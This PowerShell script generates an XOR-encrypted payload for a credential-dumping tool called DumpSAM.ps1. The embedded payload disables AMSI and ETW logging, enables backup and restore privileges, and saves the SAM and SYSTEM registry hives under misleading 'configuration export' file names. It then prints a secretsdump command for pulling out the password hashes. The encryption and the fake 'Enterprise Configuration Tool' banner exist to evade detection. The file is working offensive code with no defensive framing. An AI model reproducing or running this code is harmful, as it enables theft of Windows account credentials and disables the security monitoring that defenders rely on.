# XOR Payload Generator
# This script generates XOR-encrypted payloads for DumpSAM.ps1

$payloadCode = @'
# Decoded payload - SAM extraction module
param($Context)

$a = [Ref].Assembly.GetType(('System.Management.Automation.'+('Am'+'siUt'+'ils')))
$b = $a.GetField(('am'+'siInit'+'Failed'),'NonPublic,Static')
$b.SetValue($null,$true)

$etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if ($etwProvider) {
    $etwField = $etwProvider.GetField('etwProvider','NonPublic,Static')
    if ($etwField) { $etwField.SetValue($null, $null) }
}

function Enable-TokenPrivilege {
    param([string]$Privilege)

    $definition = @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulator {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }
}
"@

    try {
        Add-Type -TypeDefinition $definition -ErrorAction Stop
    } catch {}

    $TOKEN_ADJUST = 0x0020
    $TOKEN_QUERY = 0x0008
    $SE_PRIV_ENABLED = 0x00000002

    $hToken = [IntPtr]::Zero
    $hProcess = [TokenManipulator]::GetCurrentProcess()

    if ([TokenManipulator]::OpenProcessToken($hProcess, ($TOKEN_ADJUST -bor $TOKEN_QUERY), [ref]$hToken)) {
        $luid = New-Object TokenManipulator+LUID
        if ([TokenManipulator]::LookupPrivilegeValue($null, $Privilege, [ref]$luid)) {
            $tp = New-Object TokenManipulator+TOKEN_PRIVILEGES
            $tp.PrivilegeCount = 1
            $tp.Privileges.Luid = $luid
            $tp.Privileges.Attributes = $SE_PRIV_ENABLED
            [TokenManipulator]::AdjustTokenPrivileges($hToken, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
        }
        [TokenManipulator]::CloseHandle($hToken) | Out-Null
    }
}

Write-Host "[+] Enterprise Configuration Tool v4.0" -ForegroundColor Cyan
Write-Host ""

Enable-TokenPrivilege -Privilege "SeBackupPrivilege"
Enable-TokenPrivilege -Privilege "SeRestorePrivilege"

$outputPath = if ($Context.Path) { $Context.Path } else { Join-Path $env:TEMP "ConfigExport_$(Get-Date -Format 'yyyyMMdd_HHmmss')" }

if (-not (Test-Path $outputPath)) {
    New-Item -ItemType Directory -Path $outputPath -Force | Out-Null
}

$samFile = Join-Path $outputPath "security_accounts.dat"
$systemFile = Join-Path $outputPath "system_config.dat"

Write-Host "[*] Exporting system configuration..." -ForegroundColor Yellow

$proc1 = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SAM `"$samFile`"" -Wait -PassThru -WindowStyle Hidden
$proc2 = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SYSTEM `"$systemFile`"" -Wait -PassThru -WindowStyle Hidden

if ($proc1.ExitCode -eq 0 -and $proc2.ExitCode -eq 0) {
    Write-Host "[+] Configuration export completed successfully" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output files:" -ForegroundColor White
    Write-Host "  - $samFile"
    Write-Host "  - $systemFile"
    Write-Host ""
    Write-Host "Extract credentials with:" -ForegroundColor Cyan
    Write-Host "  secretsdump.py -sam '$samFile' -system '$systemFile' LOCAL" -ForegroundColor White
} else {
    Write-Host "[-] Configuration export failed" -ForegroundColor Red
}
'@

# XOR encryption key
$xorKey = @(0x4B,0x65,0x79,0x53,0x65,0x63,0x75,0x72,0x65,0x32,0x30,0x32,0x35)

# Convert payload to bytes
$payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payloadCode)

# XOR encrypt
$encrypted = New-Object byte[] $payloadBytes.Length
for ($i = 0; $i -lt $payloadBytes.Length; $i++) {
    $encrypted[$i] = $payloadBytes[$i] -bxor $xorKey[$i % $xorKey.Length]
}

# Generate PowerShell array format
Write-Host "XOR Key:" -ForegroundColor Cyan
Write-Host ('$xorKey = @(' + ($xorKey -join ',') + ')')
Write-Host ""

Write-Host "Encrypted Payload (copy this to DumpSAM.ps1):" -ForegroundColor Cyan
$chunks = @()
for ($i = 0; $i -lt $encrypted.Length; $i += 80) {
    $end = [Math]::Min($i + 80, $encrypted.Length)
    $chunk = $encrypted[$i..($end-1)] -join ','
    $chunks += $chunk
}

Write-Host '$encryptedPayload = @('
foreach ($chunk in $chunks) {
    Write-Host "    $chunk,"
}
Write-Host ')'

# Test decryption
Write-Host ""
Write-Host "Testing decryption..." -ForegroundColor Yellow

$decrypted = New-Object byte[] $encrypted.Length
for ($i = 0; $i -lt $encrypted.Length; $i++) {
    $decrypted[$i] = $encrypted[$i] -bxor $xorKey[$i % $xorKey.Length]
}

$decryptedText = [System.Text.Encoding]::UTF8.GetString($decrypted)

if ($decryptedText -eq $payloadCode) {
    Write-Host "[+] Decryption test PASSED" -ForegroundColor Green
} else {
    Write-Host "[-] Decryption test FAILED" -ForegroundColor Red
}

Write-Host ""
Write-Host "Payload size: $($encrypted.Length) bytes" -ForegroundColor Cyan
